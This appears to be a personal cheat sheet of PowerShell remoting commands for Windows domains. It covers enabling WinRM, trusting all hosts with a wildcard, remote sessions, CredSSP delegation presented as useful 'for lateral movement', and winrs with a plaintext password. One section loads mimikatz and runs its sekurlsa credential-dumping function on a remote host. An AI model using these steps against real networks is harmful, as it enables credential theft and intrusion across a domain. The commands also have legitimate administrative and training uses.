`ps > gcm -commandtype cmdlet -parameter computername
`ps > gcm -CommandType cmdlet | ? {$_.parameters.keys -contains "ComputerName"}
`ps > gcm -CommandType cmdlet | ? {$_.parameters.keys -contains "Credential"}
`ps > gcm -CommandType cmdlet | ? {$_.parameters.keys -contains "Credential" -and $_.parameters.keys -notcontains "Session" }

#### **HotFix Remote**

`Ps > get-hotfix -ComputerName {PCName or <IP>} -Credential Domain\administrator

#### **Test Connection On Multi PC**

`Ps > foreach ($PC in ('mal-analysis','pc-sindad','amaxpc')) {Test-Connection $PC}

#### **Enable PS Remoting**

description : 
5985 (HTTP)
5986 (HTTPS)
log on type 3 if u use `Winrm,Winrs \ PSremoting`
use this command when u are not join the domain 
this command need to administrator privilege (or user that in administrators group)
if u are in the domain this command not required 
process name is `wsmprovhost.exe`

`Ps > set-item WSman:\localhost\client\trustedhosts -Value *
`ps > Set-Item wsman:\localhost\client\trustedhosts -Value "192.168.10.17,192.168.10.18" -Force
`Ps > get-item WSman:\localhost\client\trustedhosts

Command should run on target:
`Ps > Enable-PSRemoting -Force

test : 
`Ps > Invoke-Command -ScriptBlock {$env:ComputerName} -ComputerName x.x.x.x -Credential domain\username

`Ps > Invoke-Command -ScriptBlock {Get-Process} -ComputerName x.x.x.x -Credential domain\username
#### **Create PS Session**

`ps > New-PSSession -ComputerName x.x.x.x -Credential domain\user
`ps > Get-PSSession` or `Get-PSSession -ComputerName x.x.x.x
`ps > Enter-PSSession -Id,-ComputerName // interact with target
save stage :
`ps > $mal-analysis = Get-PSSession
invoke-command alias icm
`ps > invoke-command -ScriptBlock {$proc = get-process} -session $mal-analysis
`ps > invoke-command -scriptblock {$proc} -session $mal-analysis
`ps > Remove-PSSession -Id 1
#### **interact with target Without Create Session**

`Ps > Enter-PSSession -ComputerName x.x.x.x -Credential domain\user
`Ps > get-PSHostProcessInfo
#### **Run Multi Command**

`Ps > Invoke-Command -FilePath C:\Users\scezar\Desktop\file.ps1 -ComputerName x.x.x.x -Credential domain\user

but u how we can run module on another computer ?
step 1 : import module locally 
`Ps > import-module mimikatz.ps1
step 2 : run function on module 
`Ps > Invoke-Command -ScriptBlock ${function:sekurlsa::lsa} -ComputerName x.x.x.x -Credential domain\user
u can run multicommand on multiple host
`Ps > Invoke-Command -ScriptBlock {whoami;hostname;ipconfig} -ComputerName x.x.x.x,x.x.x.x,x.x.x.x,mal-analysis -Credential domain\user

#### **Export & import Module**

when a function on target that u wan to have those function in u'r local computer u should import the function

`Ps > Import-PSSession -CommandName get-sysinfo -session $mal-analysis // load in local currnt memory

`Ps > Export-PSSession -ModuleName newname -CommandName get-sysinfo -session $mal-analysis // exported as a file

#### **Double Hop Issue**

description : for example we have three host A,B,C . we want to connect from A to B . is that work but we we want to connect to C from B we got Error ( Double Hop ). this technique is usefully for lateral movement  
Graph : A --> B --> C
step 1 : run this command on machine A 
`Ps > Enable-WSManCredSSP -Role Client -DelegateComputer "B"
step 2 : run this command on machine B
`Ps > Enable-WSManCredSSP -Role Server
step 3 : connect to B
`Ps > Enter-PSSession -ComputerName B -Credential B\administrator -Authentication CredSSP
step 4 : now u can connect to C

#### **CLASSIC COMMAND**

 `cmd > winrs -u:domain\user -p:password -r:x.x.x.x powershell.exe
 `cmd > winrs /r:hostname.domain.local powershell.exe // if u have ticket